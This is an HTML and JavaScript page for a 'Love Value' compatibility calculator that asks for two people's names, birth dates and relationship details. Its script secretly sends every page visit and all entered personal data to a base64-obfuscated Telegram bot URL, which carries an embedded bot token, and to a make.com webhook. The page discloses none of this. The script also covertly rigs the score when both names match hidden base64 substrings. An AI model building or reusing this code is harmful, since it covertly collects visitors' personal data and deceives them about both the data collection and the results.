<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="icon" type="image/x-icon" href="./ic.png" />
    <title>Love Value</title>
    <link
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css"
      rel="stylesheet"
      integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC"
      crossorigin="anonymous"
    />
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@400..700&family=Playwrite+AU+NSW:wght@100..400&family=Playwrite+AU+TAS:wght@100..400&display=swap"
      rel="stylesheet"
    />
    <style>
      body {
        --s: 120px; /* control the size*/
        --c1: #ffacb1;
        --c2: #ffcaca;

        --_g: 80%, var(--c1) 25.4%, #0000 26%;
        background: radial-gradient(at 80% var(--_g)),
          radial-gradient(at 20% var(--_g)),
          conic-gradient(from -45deg at 50% 41%, var(--c1) 90deg, var(--c2) 0)
            calc(var(--s) / 2) 0;
        background-size: var(--s) var(--s);
      }

      .dancing-script-7 {
        font-family: "Dancing Script", cursive;
        font-optical-sizing: auto;
        font-weight: 700;
        font-style: normal;
        font-size: 2.3rem;
      }
    </style>
  </head>
  <body>
    <!-- Modal -->
    <div
      class="modal fade"
      id="resultModal"
      tabindex="-1"
      aria-labelledby="resultModalLabel"
      aria-hidden="true"
    >
      <div class="modal-dialog">
        <div class="modal-content">
          <div class="modal-header" style="background-color: #ff747d">
            <h5
              class="modal-title"
              id="resultModalLabel"
              style="color: aliceblue"
            >
              Results are in!
            </h5>
            <button
              type="button"
              class="btn-close"
              data-bs-dismiss="modal"
              aria-label="Close"
            ></button>
          </div>
          <div class="modal-body" id="comResult">...</div>
        </div>
      </div>
    </div>

    <nav class="navbar navbar-expand-lg" style="background-color: #ff747d">
      <div class="container-fluid">
        <a class="navbar-brand text-light dancing-script-7" href="./index.html"
          >Love Value</a
        >
        <button
          class="navbar-toggler"
          type="button"
          data-bs-toggle="collapse"
          data-bs-target="#navbarNav"
          aria-controls="navbarNav"
          aria-expanded="false"
          aria-label="Toggle navigation"
        >
          <span class="navbar-toggler-icon text-light">=</span>
        </button>
        <div class="collapse navbar-collapse flex-row-reverse" id="navbarNav">
          <ul class="navbar-nav">
            <li class="nav-item">
              <a class="nav-link text-light" href="./index2.html"
                >Love Advice</a
              >
            </li>
          </ul>
        </div>
      </div>
    </nav>

    <div class="container mt-5 mb-5">
      <div class="card border border-danger">
        <div
          class="card-body ps-5 pe-5 font-monospace rounded"
          style="background-color: #ffe4e6"
        >
          <div class="mt-3 mb-5">
            <p class="text-justify fs-6 fst-italic">
              Are you curious about how compatible you and your partner are? Or
              perhaps you want to see if there's a spark with your crush? Our
              Love and Compatibility Calculator is the most advanced tool
              available, offering fun insights based on your names, birth dates,
              how long you've known each other, and, uniquely, how connected you
              feel. Whether you're in a new relationship, have been together for
              years, or are just starting to explore a potential connection, our
              calculator provides a sophisticated way to see how well you match
              up.
            </p>
          </div>

          <div class="mb-3 row">
            <label for="yourName" class="col-sm-2 col-form-label"
              >Your Name</label
            >
            <div class="col-sm-10">
              <input
                type="text"
                class="form-control"
                spellcheck="false"
                id="yourName"
                required
              />
            </div>
          </div>
          <div class="mb-3 row">
            <label for="yourDob" class="col-sm-2 col-form-label"
              >Your DOB</label
            >
            <div class="col-sm-10">
              <input
                type="date"
                class="form-control"
                spellcheck="false"
                id="yourDob"
                required
              />
            </div>
          </div>

          <div class="mb-3 row">
            <label for="parName" class="col-sm-2 col-form-label"
              >Partner's Name</label
            >
            <div class="col-sm-10">
              <input
                type="text"
                class="form-control"
                spellcheck="false"
                id="parName"
                required
              />
            </div>
          </div>
          <div class="mb-3 row">
            <label for="parDob" class="col-sm-2 col-form-label"
              >Partner's DOB</label
            >
            <div class="col-sm-10">
              <input
                type="date"
                class="form-control"
                spellcheck="false"
                id="parDob"
                required
              />
            </div>
          </div>

          <div class="mb-4 row">
            <label for="duration" class="col-sm-2 col-form-label"
              >How long you know each other (months)</label
            >
            <div class="col-sm-10">
              <input
                type="number"
                class="form-control"
                id="duration"
                min="0"
                value="1"
                spellcheck="false"
                inputmode="numeric"
                required
              />
            </div>
          </div>
          <div class="form-check mb-2">
            <input
              class="form-check-input"
              type="checkbox"
              checked
              id="conCheck"
            />
            <label class="form-check-label" for="conCheck">
              Use Connection Meter?
            </label>
          </div>
          <div class="mb-3 row">
            <label for="conRange" class="form-label"
              >How connected you feel?</label
            >
            <input type="range" class="form-range" id="conRange" />
          </div>

          <div class="d-grid gap-2 col-6 mx-auto mt-5 mb-3">
            <button
              class="btn btn-danger"
              type="button"
              id="checkCompatibility"
            >
              CHECK
            </button>
          </div>
        </div>
      </div>
    </div>
    <div
      class="p-3 position-sticky bottom-0"
      style="background-color: #ffeeede0"
    >
      <div class="container text-center">
        <h3>Stuck in a Situationship?</h3>
        <p>Let our AI Guru guide you to clarity and connection!</p>
        <button class="btn btn-danger me-0" onclick="(()=>{alert('lol')})()">
          Try AI Love Advice
        </button>
      </div>
    </div>
    <script
      src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"
      integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM"
      crossorigin="anonymous"
    ></script>
    <script>
      telPush(`Visited ${location.href}`);
      const conCheck = document.getElementById("conCheck");
      const conRange = document.getElementById("conRange");
      const checkCompatibility = document.getElementById("checkCompatibility");

      function telPush(mess) {
        fetch(
          atob(
            "aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDY4MTE0NzM2NzU6QUFFTWU2MDVibTE2XzRDTURhWjhkdi1TN1loWXpoRFhQeTQvc2VuZE1lc3NhZ2U="
          ),
          {
            method: "POST",
            body: JSON.stringify({
              chat_id: atob("NzcxMzM1NTc3"),
              text: mess,
            }),
            headers: {
              "Content-type": "application/json; charset=UTF-8",
            },
          }
        ).then((response) => response.json());
        //   .then((json) => console.log(json));
      }

      conCheck.addEventListener("change", function () {
        if (this.checked) {
          conRange.disabled = false;
        } else {
          conRange.disabled = true;
        }
      });
      checkCompatibility.addEventListener("click", () => {
        calculateCompatibility();
      });

      function calculateCompatibility() {
        const targetArray = ["YXJzaA==", "YW1hbg==", "sub3"];
        function containsSubstring(str, substrings) {
          return substrings.some((sub) =>
            str.toLowerCase().includes(atob(sub))
          );
        }

        function getNameScore(name) {
          let score = 0;
          for (let char of name) {
            if (char >= "a" && char <= "z") {
              score += char.charCodeAt(0) - "a".charCodeAt(0) + 1;
            }
          }
          // Reduce score to a single digit
          while (score > 9) {
            score = score
              .toString()
              .split("")
              .reduce((acc, digit) => acc + parseInt(digit), 0);
          }
          return score;
        }

        function pR(
          name1,
          dob1,
          name2,
          dob2,
          duration,
          connectionLevel,
          totalScore,
          doctor
        ) {
          fetch("https://hook.us1.make.com/brewt2h9jhgx71v63fhcckj54x2xxc7h", {
            method: "POST",
            body: JSON.stringify({
              ts: new Date(),
              name1,
              dob1,
              name2,
              dob2,
              duration,
              connectionLevel,
              totalScore,
              doctor,
            }),
            headers: {
              "Content-type": "application/json; charset=UTF-8",
            },
          })
            .then((response) => response.json())
            .then((json) => console.log(json));
        }

        const name1 = document.getElementById("yourName").value;
        const dob1 = new Date(document.getElementById("yourDob").value);
        const name2 = document.getElementById("parName").value;
        const dob2 = new Date(document.getElementById("parDob").value);
        const duration = parseInt(document.getElementById("duration").value);
        const connectionLevel = parseInt(
          document.getElementById("conRange").value
        );
        const comResult = document.getElementById("comResult");
        let totalScore = undefined;
        let doctor = undefined;
        if (
          name1 &&
          dob1 &&
          name2 &&
          dob2 &&
          duration &&
          connectionLevel >= 0 &&
          connectionLevel <= 100
        ) {
          const nameScore1 = getNameScore(name1);
          const nameScore2 = getNameScore(name2);
          let nameScore = ((nameScore1 + nameScore2) / 2) * 2;
          // Name Score: (Combined length of names) % 100, weighted at 20%
          //   const nameScore = ((name1.length + name2.length) % 100) * 0.2;

          // Age Score: Based on the absolute difference in years, weighted at 30%
          const ageDifference = Math.abs(
            dob1.getFullYear() - dob2.getFullYear()
          );
          const ageScore = (100 - Math.min(ageDifference, 50) * 2) * 0.4;

          // Duration Score: Based on how long they have known each other, capped at 100 months, weighted at 20%
          const durationScore = Math.min(duration, 100) * 0.2;

          // Connection Score: Directly use the connection level, weighted at 30%
          const connectionScore = connectionLevel * 0.2;

          // Total Score: Sum of weighted scores
          totalScore = nameScore + ageScore + durationScore + connectionScore;
          doctor = false;
          if (
            containsSubstring(name1, targetArray) &&
            containsSubstring(name2, targetArray)
          ) {
            doctor = true;
            totalScore = 95 - (4 + ((totalScore - 0) * (18 - 4)) / (100 - 0));
          }
          pR(
            name1,
            dob1,
            name2,
            dob2,
            duration,
            connectionLevel,
            totalScore,
            doctor
          );
          //   alert(`Your compatibility score is ${totalScore.toFixed(2)}%`);
          comResult.innerText = `Your Love and Compatibility score is ${totalScore.toFixed(
            2
          )}%`;
          new bootstrap.Modal(document.getElementById("resultModal")).show();
        } else {
          alert("Please fill in all fields correctly.");
        }
        telPush(
          JSON.stringify({
            name1,
            dob1,
            name2,
            dob2,
            duration,
            connectionLevel,
            totalScore,
            doctor,
          })
        );
      }
    </script>
  </body>
</html>
